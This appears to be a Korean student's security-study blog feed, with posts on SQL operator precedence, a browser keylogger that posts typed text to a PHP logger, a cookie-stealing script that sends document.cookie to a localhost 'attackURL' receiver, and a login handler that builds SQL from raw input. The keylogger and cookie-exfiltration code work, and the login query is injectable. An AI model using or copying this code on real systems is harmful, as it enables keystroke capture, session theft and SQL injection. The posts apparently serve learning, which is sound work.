<p><span style="font-weight:bold; font-size:20px">답은</span></p>

<p><img src="/images/2024-05-16-SQLinjection1/image-20240516035152070.png" alt="image-20240516035152070" /></p>

<p>1+3*2는 뭐가 답일 까요? 답은 7입니다. 곱하기를 먼저 계산하고, 1을 나중에 더하죠.<br />
이와 마찬가지로 and를 * 로 생각하고 or 덧셈으로 생각해야 합니다.</p>

<p>select * from table where id = ‘kim’ or (‘1’ =’1’ and passoword = ‘5678’) 이렇게 보면<br />
id가 kim이거나 password가 5678인 데이터가 출력하게 됩니다.</p>

<p>다음엔 sql injection에 관련된 문제를 풀어보도록 하겠습니다.</p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">4주차 키로거 만들기</title><link href="http://localhost:4000/project/Project5/" rel="alternate" type="text/html" title="4주차 키로거 만들기" /><published>2024-05-14T00:00:00+09:00</published><updated>2024-05-14T00:00:00+09:00</updated><id>http://localhost:4000/project/Project5</id><content type="html" xml:base="http://localhost:4000/project/Project5/"><![CDATA[<p><br /></p>

<h1 id="1키로거-만들기"><span style="background:#000000; color:#ffffff">1.키로거 만들기</span></h1>

<p><br /></p>

<p>키로거란? 사용자가 작성하는 글을 기록하고 전송하는 것을 말합니다. 즉 사용자의 입력의 데이터를 가져오는 것입니다.</p>

<p>키로거를 만든 것을 보여드리면서 코드를 설명하겠습니다.</p>

<p><img src="/images/2024-05-14-3/image-20240514033456490.png" alt="image-20240514033456490" style=" zoom: 50%;" /><img src="/images/2024-05-14-3/image-20240514034539596.png" alt="image-20240514034539596" style="zoom:50%;" /></p>

<p>▶ 글을 작성하니, 작성한 글이 txt파일에 저장되는 모습!</p>

<p><br /></p>

<h2 id="11-keyloghtml"><span style="background:#696969; color:#ffffff">1.1 keylog.html</span></h2>

<p><br /></p>

<p>저는  기본적으로 작성할 텍스트 박스를 만들었고, 텍스트의 내용을 밑에 표시하고 싶었기 때문에 pre를 작성해두었습니다.<br />
필요에 따라 밑에 표시하는 구문은 지우셔도 무방합니다.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;</span>keylogger<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;h1&gt;</span>keylogger<span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">id=</span><span class="s">"input"</span> <span class="na">placeholder=</span><span class="s">"입력할 글자를 넣어주세요"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;pre</span> <span class="na">id=</span><span class="s">"log"</span><span class="nt">&gt;&lt;/pre&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"keylogger.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p><br /></p>

<h2 id="12-keyloggerjs"><span style="background:#696969; color:#ffffff">1.2 keylogger.js</span></h2>

<p><br />▶<span style="font-weight:bold; font-size:20px">DOMContentLoaded로 구성 및 변수지정</span></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">document</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">DOMContentLoaded</span><span class="dl">'</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>		<span class="err">#</span><span class="nx">DOM이</span> <span class="nx">완료되고</span><span class="p">,</span> <span class="nx">초기에</span> <span class="nx">스크립트를</span> <span class="nx">실행하기</span> <span class="nx">위함</span><span class="p">.</span>
    <span class="kd">const</span> <span class="nx">input</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">input</span><span class="dl">'</span><span class="p">);</span>		<span class="err">#</span> <span class="nx">작성할곳</span>	
    <span class="kd">const</span> <span class="nx">log</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">log</span><span class="dl">'</span><span class="p">);</span>			<span class="err">#</span> <span class="nx">작성한</span> <span class="nx">것이</span> <span class="nx">밑에</span> <span class="nx">나타날</span> <span class="nx">곳</span>	
    <span class="kd">let</span> <span class="nx">composing</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>					<span class="err">#</span> <span class="nx">IME</span> <span class="nx">입력</span> <span class="nx">중인지</span> <span class="nx">나타내는</span> <span class="nf">플래그</span><span class="p">(</span><span class="nx">한글작성을</span> <span class="nx">위해</span><span class="p">)</span>
    <span class="kd">let</span> <span class="nx">buffer</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>						<span class="err">#</span> <span class="nx">데이터를</span> <span class="nx">임시</span> <span class="nf">저장</span><span class="p">(</span><span class="nx">한글의</span> <span class="nx">문장열을</span> <span class="nx">한꺼번에</span> <span class="nx">보내려고</span><span class="p">)</span>
    <span class="kd">let</span> <span class="nx">timeoutId</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>					<span class="err">#</span> <span class="nx">디바운싱을</span> <span class="nx">위한</span> <span class="nx">타임아웃</span> <span class="nc">ID</span><span class="p">(</span><span class="nx">불필요한</span> <span class="nx">텍스트를피하려고</span><span class="p">)</span>
</code></pre></div></div>

<p><br /></p>

<p>▶<span style="font-weight:bold; font-size:20px">IME 입력으로 한글적기 및 밑에 텍스트 내용 표시하기</span></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="err">#</span><span class="nx">한글을</span> <span class="nx">작성할</span> <span class="nx">때</span> 
 <span class="err">#</span><span class="p">(</span><span class="nx">영어가</span> <span class="nx">아닌</span> <span class="nx">한글은</span> <span class="nx">자음가</span> <span class="nx">모음의</span> <span class="nx">결합된</span> <span class="nx">형태이기</span> <span class="nx">때문에</span> <span class="nx">composing을</span> <span class="nx">이용하여</span> <span class="nx">문자조합의</span> <span class="nx">시작과</span> <span class="nx">끝을</span> <span class="nx">나누어서</span> <span class="nx">봐야한다</span><span class="p">.)</span>

	<span class="nx">input</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">compositionstart</span><span class="dl">'</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>	<span class="err">#</span><span class="nx">입력을</span> <span class="nx">시작</span><span class="p">,</span> <span class="nx">true는</span> <span class="nx">입력중이라는</span> <span class="nx">뜻</span><span class="p">.</span>
        <span class="nx">composing</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">});</span>

    <span class="nx">input</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">compositionend</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>	<span class="err">#</span><span class="nx">입력</span> <span class="nx">끝</span><span class="p">,</span> <span class="nx">false는</span> <span class="nx">입력을</span> <span class="nx">끝냈다는</span> <span class="nx">뜻</span><span class="p">.</span>
        <span class="nx">composing</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>					<span class="err">#</span><span class="nx">한글</span> <span class="nx">작성을</span> <span class="nx">끝내고</span><span class="p">,</span><span class="nx">buffer와log에</span> <span class="nx">데이터를</span> <span class="nx">추가</span>
        <span class="nx">buffer</span> <span class="o">+=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">data</span> <span class="o">||</span> <span class="dl">''</span><span class="p">;</span>
        <span class="nx">log</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">+=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">data</span> <span class="o">||</span> <span class="dl">''</span><span class="p">;</span>
        <span class="nf">sendData</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>					<span class="err">#</span> <span class="nx">buffer에</span> <span class="nx">저장된</span> <span class="nx">텍스트를</span> <span class="nx">서버로</span> <span class="nx">전송</span>
        <span class="nx">buffer</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>						<span class="err">#</span> <span class="nx">buffer</span> <span class="nx">초기화</span>
    <span class="p">});</span>
<span class="o">-----------------------------------------------------------------------------------------------------------</span>
    <span class="err">#</span><span class="nx">영어를</span> <span class="nx">작성하거나</span> <span class="nx">기타</span> <span class="nx">다른</span> <span class="nx">것을</span> <span class="nx">작성할</span> <span class="nf">때</span><span class="p">(</span><span class="nx">밑에</span> <span class="nx">log</span> <span class="nx">작성안할시</span><span class="p">,</span><span class="nx">if문에</span> <span class="nx">buffer</span> <span class="nx">데이터추가하고</span> <span class="nx">서버에</span> <span class="nx">보내도</span> <span class="nx">됌</span><span class="p">)</span>

    <span class="nx">input</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">input</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>					
        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">composing</span><span class="p">)</span> <span class="p">{</span>						<span class="err">#</span> <span class="nx">한글을</span> <span class="nx">입력하지</span> <span class="nx">않고</span> <span class="nx">다른것을</span> <span class="nx">작성할때</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">inputType</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">deleteContentBackward</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>		<span class="err">#</span> <span class="nx">backspace키</span>
                <span class="nx">log</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">log</span><span class="p">.</span><span class="nx">textContent</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>		<span class="err">#</span> <span class="nx">slice는</span> <span class="nx">추출해서</span> <span class="nx">새로운</span> <span class="nx">문자열</span> <span class="nx">만드는것</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>							<span class="p">(</span><span class="nx">인덱스0</span><span class="p">,</span> <span class="nx">인덱스</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="nx">이므로</span> <span class="nx">마지막단어빼고</span> <span class="nx">만듬</span>
                <span class="nx">log</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">+=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">data</span> <span class="o">||</span> <span class="dl">''</span><span class="p">;</span>			<span class="err">#</span> <span class="nx">나머지는</span> <span class="nx">영어라서</span> <span class="nx">log에</span> <span class="nx">데이터</span> <span class="nx">추가</span>
            <span class="p">}</span>
            <span class="nf">debounceSendData</span><span class="p">(</span><span class="nx">log</span><span class="p">.</span><span class="nx">textContent</span><span class="p">);</span>				<span class="err">#</span> <span class="nx">디바운싱을</span> <span class="nx">적용하여</span> <span class="nx">서버에</span> <span class="nx">전송</span>
        <span class="p">}</span>								<span class="nx">시간</span> <span class="nx">차를</span> <span class="nx">이용해서</span> <span class="nx">텍스트를</span> <span class="nx">모아서</span> <span class="nx">한꺼번에</span> <span class="nx">처리하여</span><span class="p">,</span> <span class="nx">log에</span> <span class="nx">불필요한</span> <span class="nx">텍스트가</span> <span class="nx">생기는</span> <span class="nx">것을</span> <span class="nx">방지한다</span><span class="p">.</span>
    <span class="p">});</span>

</code></pre></div></div>

<p><br /></p>

<p>▶<span style="font-weight:bold; font-size:20px">데이터 전송하기 및 서버 응답 상태 확인하기</span></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="err">###</span><span class="nx">글</span> <span class="nx">작성시</span><span class="p">,</span> <span class="nx">바로</span> <span class="nx">서버에</span> <span class="nx">보내면</span> <span class="nx">불필요한</span> <span class="nx">글까지</span> <span class="nx">전송된다</span><span class="p">.</span> <span class="nx">하여</span> <span class="nx">시간</span> <span class="nx">차를</span> <span class="nx">두어</span> <span class="nx">수정할</span> <span class="nx">시간을</span> <span class="nx">확보하기</span> <span class="nx">위함이다</span><span class="p">.</span><span class="err">###</span> 
    
    <span class="kd">function</span> <span class="nf">debounceSendData</span><span class="p">(</span><span class="nx">text</span><span class="p">)</span> <span class="p">{</span>
        <span class="nf">clearTimeout</span><span class="p">(</span><span class="nx">timeoutId</span><span class="p">);</span>		<span class="err">#</span><span class="nx">이전에</span> <span class="nx">설정된</span> <span class="nx">타임을</span> <span class="nx">취소</span><span class="p">.</span>
        <span class="nx">timeoutId</span> <span class="o">=</span> <span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>		<span class="err">#</span><span class="nx">새로운</span> <span class="nx">타임</span> <span class="nx">설정</span><span class="p">,</span> <span class="mi">2</span><span class="nx">초후에</span> <span class="nx">서버로</span> <span class="nx">text를</span> <span class="nx">보냄</span><span class="p">.</span>
            <span class="nf">sendData</span><span class="p">(</span><span class="nx">text</span><span class="p">);</span> 
        <span class="p">},</span> <span class="mi">2000</span><span class="p">);</span> 
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">sendData</span><span class="p">(</span><span class="nx">text</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>		<span class="err">#</span><span class="nx">웹페이지가</span> <span class="nx">로딩이</span> <span class="nx">끝난뒤에도</span> <span class="nx">서버에</span> <span class="nx">데이터를</span> <span class="nx">주고</span> <span class="nx">받을수</span> <span class="nx">있음</span><span class="p">.</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">keylog.php</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>	<span class="err">#</span><span class="nx">요청을</span> <span class="nx">설정</span><span class="p">.</span> <span class="p">(</span><span class="nx">메서드</span><span class="p">,</span> <span class="nx">경로</span><span class="p">,</span> <span class="nf">비동기</span><span class="p">(</span><span class="kc">true</span><span class="p">),</span><span class="nf">동기</span><span class="p">(</span><span class="kc">false</span><span class="p">))</span>
        					<span class="nx">동기</span><span class="p">:</span> <span class="nx">데이터베이스</span> <span class="nx">검색후</span><span class="p">,</span> <span class="nx">다음코드</span> <span class="nx">진행하는</span> <span class="nx">것처럼</span> <span class="nx">한작업</span> <span class="nx">끝나고</span> <span class="nx">진행</span>
                        			<span class="nx">비동기</span><span class="p">:</span><span class="nx">서버에</span> <span class="nx">데이터주고받을때</span> <span class="nx">처럼</span> <span class="nx">바로</span> <span class="nx">요청에</span> <span class="nx">응답처리</span>
        
                                                
        <span class="err">###</span><span class="nx">http요청헤더</span> <span class="nx">content</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">헤더에서</span> <span class="nx">보낸</span> <span class="nx">데이터가</span> <span class="nx">url을</span> <span class="nx">인코딩</span><span class="p">,</span> <span class="nx">문자</span> <span class="nx">인코딩이</span> <span class="nx">utf</span><span class="o">-</span><span class="mi">8</span> <span class="nx">지정</span><span class="err">###</span>   
         
        <span class="nx">xhr</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded; charset=UTF-8</span><span class="dl">'</span><span class="p">);</span>

        
        <span class="err">###</span><span class="nx">http요청이</span> <span class="nx">완료되었을</span> <span class="nx">때</span><span class="p">,</span> <span class="nx">http상태가</span> <span class="mi">200</span><span class="p">(</span><span class="nx">좋음</span><span class="p">)</span><span class="nx">인지</span> <span class="nx">아닌지에</span> <span class="nx">따라</span> <span class="nx">출력하기</span><span class="err">###</span>
        
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Data sent successfully:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Failed to send data:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">};</span>

        <span class="nx">xhr</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="s2">`keys=</span><span class="p">${</span><span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">text</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span> 		<span class="err">#</span><span class="nx">데이터</span> <span class="nx">인코딩해서</span> <span class="nx">전송</span>
    <span class="p">}</span>
<span class="p">});</span>

</code></pre></div></div>

<p><br /></p>

<h2 id="13-keylogphp"><span style="background:#696969; color:#ffffff">1.3 keylog.php</span></h2>

<p><br /></p>

<p>▶<span style="font-weight:bold; font-size:20px">데이터 txt 파일로 보내기</span></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"POST"</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$keys</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'keys'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>             <span class="c1"># key가 존재하지 않거나 null값이면 ''</span>
    <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"keylog.txt"</span><span class="p">,</span> <span class="nv">$keys</span> <span class="mf">.</span> <span class="kc">PHP_EOL</span><span class="p">,</span> <span class="no">FILE_APPEND</span> <span class="o">|</span> <span class="no">LOCK_EX</span><span class="p">);</span> 
<span class="p">}</span>	<span class="c1">#PHP_EOL:줄바꿈 추가#  #FILE_APPEND:기존내용유지,뒤에 계속내용추가# #LOCK_EX:다른프로세스가 파일을 변경할수 없게함#</span>
</code></pre></div></div>]]></content><author><name>ethan</name></author><category term="project" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">4주차 쿠키 탈취 만들기</title><link href="http://localhost:4000/project/Project6/" rel="alternate" type="text/html" title="4주차 쿠키 탈취 만들기" /><published>2024-05-14T00:00:00+09:00</published><updated>2024-05-14T00:00:00+09:00</updated><id>http://localhost:4000/project/Project6</id><content type="html" xml:base="http://localhost:4000/project/Project6/"><![CDATA[<p><br /></p>

<h1 id="1쿠키-탈취-만들기"><span style="background:#000000; color:#ffffff">1.쿠키 탈취 만들기</span></h1>

<p><br /></p>

<p>http상태 200 으로 양호하고, user = normaltic 이라는 쿠키를 담고 있습니다. 이 쿠키를 탈취해봅시다.</p>

<p><img src="/images/2024-05-14-Project6/image-20240514195031752.png" alt="image-20240514195031752" /></p>

<p><br /></p>

<h2 id="11-cookie-hijackinghtml"><span style="background:#696969; color:#ffffff">1.1 Cookie Hijacking.html</span></h2>

<p><br /></p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;</span>Security Test Page<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;h1&gt;</span>Cookie Hijacking 테스트 하기<span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"Cookie Hijacking.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p><br /></p>

<h2 id="12-cookie-hijackingjs"><span style="background:#696969; color:#ffffff">1.2 Cookie Hijacking.js</span></h2>

<p><br /></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>			<span class="err">#</span> <span class="nx">http요청이</span> <span class="nx">완료되었을때</span><span class="p">,</span> <span class="nx">user</span><span class="o">=</span><span class="nx">normaltic이라는</span> <span class="nx">쿠키를</span> <span class="nx">설정하고</span><span class="p">,</span> <span class="nx">서버로</span> <span class="nx">보내기</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">user=normaltic; path=/</span><span class="dl">"</span><span class="p">;</span>
    <span class="nf">sendDataToServer</span><span class="p">();</span>  
<span class="p">}</span>

<span class="kd">function</span> <span class="nf">sendDataToServer</span><span class="p">()</span> <span class="p">{</span>			<span class="err">#</span> <span class="nx">탈취할</span> <span class="nx">url중</span> <span class="nx">쿠키는</span> <span class="nx">인코딩하여</span><span class="p">,</span><span class="nx">이미지</span> <span class="nx">파일을</span> <span class="nx">불러옵니다</span><span class="p">.</span>
    <span class="kd">const</span> <span class="nx">cookieData</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">attackURL</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://localhost:8080/receive.php?cookie=</span><span class="dl">"</span><span class="p">;</span>
    <span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">attackURL</span> <span class="o">+</span> <span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">cookieData</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>이미지 파일을 불러오는 이유 :  사실 이미지 파일이 없어서 이미지를 불러오는 건 중요한 게 아닙니다. 하지만 url로 요청하게 되면 동시에 get 방식으로 서버에 쿠키 정보를 넘겨주는 역할을 수행하기 때문에 이미지 파일을 불러오는 것 입니다.</p>

<p><br /></p>

<h2 id="13-receivephp"><span style="background:#696969; color:#ffffff">1.3 receive.php</span></h2>

<p><br /></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>					<span class="c1"># 쿠기의 정보를 cookies.txt 에 저장하기.</span>
<span class="nv">$cookie</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cookie'</span><span class="p">];</span>
<span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'cookies.txt'</span><span class="p">,</span> <span class="nv">$cookie</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="no">FILE_APPEND</span><span class="p">);</span>
					<span class="c1">#(파일명, 쿠키정보 .줄바꿈 , 파일 뒤에 정보 계속 추가하기 )</span>
</code></pre></div></div>

<p><img src="/images/2024-05-14-Project6/image-20240514203739235.png" alt="image-20240514203739235" /></p>]]></content><author><name>ethan</name></author><category term="project" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">3주차 로그인의 식별과 인증, 해싱처리하기</title><link href="http://localhost:4000/project/Project4/" rel="alternate" type="text/html" title="3주차 로그인의 식별과 인증, 해싱처리하기" /><published>2024-05-11T00:00:00+09:00</published><updated>2024-05-11T00:00:00+09:00</updated><id>http://localhost:4000/project/Project4</id><content type="html" xml:base="http://localhost:4000/project/Project4/"><![CDATA[<p><br /></p>

<h1 id="1로그인의-식별과-인증-4가지-만들기"><span style="background:#000000; color:#ffffff">1.로그인의 식별과 인증 4가지 만들기</span></h1>

<p><br /></p>

<p>로그인을 하기 위해서 식별과 인증을 해야 한다는 것을 배웠습니다.<br />
이론적인 것은 간단한 로직으로 작성할 수 있고,  쉽게 찾아 볼 수 있기 때문에 <br />
제가 만든 로그인 폼의 식별과 인증을 살펴보도록 하겠습니다.</p>

<p><br /></p>

<h2 id="11-식별과-인증-동시에-진행"><span style="background:#696969; color:#ffffff">1.1 식별과 인증 동시에 진행</span></h2>

<p><br /></p>

<p>▶<span style="font-weight:bold; font-size:20px">1번 방식</span></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span>					<span class="c1"># 세션 파트에서 보았듯 로그인을 유지하기 위해 사용.</span>
<span class="k">include</span> <span class="s1">'db.php'</span><span class="p">;</span>					<span class="c1"># db.php db를 연결한 스크립트를 현재 스크립트에 포함시킴.(db를 이용하기위함)</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"POST"</span><span class="p">)</span> <span class="p">{</span>		<span class="c1">#요청받은 방식이 post일때만 진행 # if의()는 true를 뜻한다.  </span>
  <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>					<span class="c1">#로그인 폼에 사용자가 입력한 id</span>
  <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span>			<span class="c1">#로그인 폼에 사용자가 입력한 password</span>
  
  <span class="c1">#db로부터 사용자가 작성한 id password 둘다 맞는 데이터를 찾음(식별과 인증이 동시에 들어감)</span>
  <span class="nv">$sqls</span> <span class="o">=</span> <span class="s2">"SELECT * FROM DATA WHERE id='</span><span class="nv">$id</span><span class="s2">' AND psw='</span><span class="nv">$password</span><span class="s2">'"</span><span class="p">;</span>											   
  <span class="nv">$result</span> <span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span><span class="nv">$sqls</span><span class="p">);</span>			<span class="c1">#그 데이터에 대한 쿼리를 실행</span>
  <span class="nv">$row</span> <span class="o">=</span> <span class="nf">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>			<span class="c1">#그 결과를 배열형식으로 가져옴</span>
    
  <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])){</span>				<span class="c1">#그 결과의 id가 존재하면 로그인 성공페이지로, 아니면 실패페이지로 각각보냄.</span>
    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'Username'</span><span class="p">]</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>			<span class="c1">#로그인을 성공했을때 id를 세션에 저장하여, 로그인 유지 </span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /login_success.php'</span><span class="p">);</span>
    <span class="k">exit</span><span class="p">();</span>
  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /index.php?incorrect=invaild login name or password'</span><span class="p">);</span>
    <span class="k">exit</span><span class="p">();</span>
  <span class="p">}</span>
<span class="p">}</span> 
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p><br />▶<span style="font-weight:bold; font-size:20px">2번 방식</span></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span> 		<span class="c1"># 세션을 시작</span>
<span class="k">include</span> <span class="s1">'db.php'</span><span class="p">;</span> 		<span class="c1"># 데이터베이스 연결 파일을 포함</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"POST"</span><span class="p">)</span> <span class="p">{</span> 		<span class="c1"># post방식인 것만 진행(확인하는 용도)</span>
    <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span> 				<span class="c1"># 로그인 폼에 사용자가 입력한 id</span>
    <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span> 			<span class="c1"># 로그인 폼에 사용자가 입력한 password</span>

    
    <span class="c1">#db로부터 사용자가 작성한 id password 둘다 맞는 데이터를 찾음(식별과 인증이 동시에 들어감) </span>
